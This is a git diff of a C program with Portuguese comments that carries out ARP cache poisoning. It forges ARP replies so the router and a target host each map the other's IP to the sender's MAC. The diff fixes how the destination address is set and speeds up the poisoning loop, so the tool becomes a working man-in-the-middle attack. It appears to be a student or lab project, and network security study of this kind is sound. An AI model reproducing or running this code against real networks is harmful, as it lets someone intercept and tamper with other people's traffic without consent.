@@ -424,15 +424,6 @@ void sendarprouter(){
 	getmactarget(sender_ip,1);
 
 
-	/*=========== PREPARE SOCKADDR_LL =============*/
- 	/* Indice da interface de rede */
-	socket_address.sll_ifindex = if_idx.ifr_ifindex;
-	/* Tamanho do endereco (ETH_ALEN = 6) */
-	socket_address.sll_halen = ETH_ALEN;
-	/* Endereco MAC de destino */
-	//memcpy(socket_address.sll_addr, target_mac_router, MAC_ADDR_LEN);
-	
-
 	/*============== MONTA CABECALHO ARP =========*/
 	/* Hardware type (16 bits): 1 for ethernet */
 	arphdr_router.htype = htons (1);
@@ -454,6 +445,7 @@ void sendarprouter(){
 	getMac(sender_ip,arphdr_router.target_mac);
 
 
+
 	/*==== AQUI ESTA O TOQUE ME VOI ===*/
 	//salva o ip do TARGET como se ele tivesse enviado
 	inet_pton (AF_INET, target_ip, &arphdr_router.sender_ip);
@@ -461,6 +453,17 @@ void sendarprouter(){
 	//inet_pton (AF_INET, target_ip, &arphdr.sender_ip);
 	//Informa o ip alvo que recebe o pacote, neste caso o ROUTER
 	inet_pton (AF_INET, sender_ip, &arphdr_router.target_ip);
+
+
+	/*=========== PREPARE SOCKADDR_LL =============*/
+ 	/* Indice da interface de rede */
+	socket_address.sll_ifindex = if_idx.ifr_ifindex;
+	/* Tamanho do endereco (ETH_ALEN = 6) */
+	socket_address.sll_halen = ETH_ALEN;
+	/* Endereco MAC de destino */
+	memcpy(socket_address.sll_addr, arphdr_router.target_mac, MAC_ADDR_LEN);
+	
+
 
 
 	/*============= PREENCHE BUFFER ==============*/
@@ -548,15 +551,6 @@ void sendarptarget(){
 	sprintf(sender_ip, "%d.%d.%d.%d", sender_byte[0],sender_byte[1],sender_byte[2],sender_byte[3]);
 
 
-	/*=========== PREPARE SOCKADDR_LL =============*/
-   /* Indice da interface de rede */
-	socket_address.sll_ifindex = if_idx.ifr_ifindex;
-	/* Tamanho do endereco (ETH_ALEN = 6) */
-	socket_address.sll_halen = ETH_ALEN;
-	/* Endereco MAC de destino */
-	//MEXI AQUI memcpy(socket_address.sll_addr, dest_mac, MAC_ADDR_LEN);
-	//memcpy(socket_address.sll_addr, target_mac, MAC_ADDR_LEN);
-	
 
 	/*============== MONTA CABECALHO ARP =========*/
 	/* Hardware type (16 bits): 1 for ethernet */
@@ -571,8 +565,6 @@ void sendarptarget(){
 	arphdr.opcode = htons (2);
 	//informa hardware address de origem
 	memcpy (&arphdr.sender_mac, if_mac.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
-
-
 	//informa seta o mac do destinatario
 	getMac(target_ip, arphdr.target_mac);
 	
@@ -587,6 +579,15 @@ void sendarptarget(){
 	inet_pton (AF_INET, target_ip, &arphdr.target_ip);
 
 
+	/*=========== PREPARE SOCKADDR_LL =============*/
+   /* Indice da interface de rede */
+	socket_address.sll_ifindex = if_idx.ifr_ifindex;
+	/* Tamanho do endereco (ETH_ALEN = 6) */
+	socket_address.sll_halen = ETH_ALEN;
+	/* Endereco MAC de destino */
+	//MEXI AQUI memcpy(socket_address.sll_addr, dest_mac, MAC_ADDR_LEN);
+	memcpy(socket_address.sll_addr, arphdr.target_mac, MAC_ADDR_LEN);
+	
 
 	/*============= PREENCHE BUFFER ==============*/
 	/* Preenche o buffer com 0s */
@@ -603,6 +604,7 @@ void sendarptarget(){
 	/* Preenche o buffer com os dados do arp */
 	memcpy (buffer + frame_len, &arphdr, ARP_HDRLEN * sizeof (uint8_t));
 	frame_len += ARP_HDRLEN;
+
 
 
 	// Envia pacote 
@@ -625,7 +627,7 @@ void  poisoning(){
 		//Envia meu endereco mac para o target informando que sou o router
 		sendarptarget();
 
-		sleep(2);
+		sleep(1);
 
 		printf("02 \n");
 		//Envia para o router meu endereco mac informando que sou o target
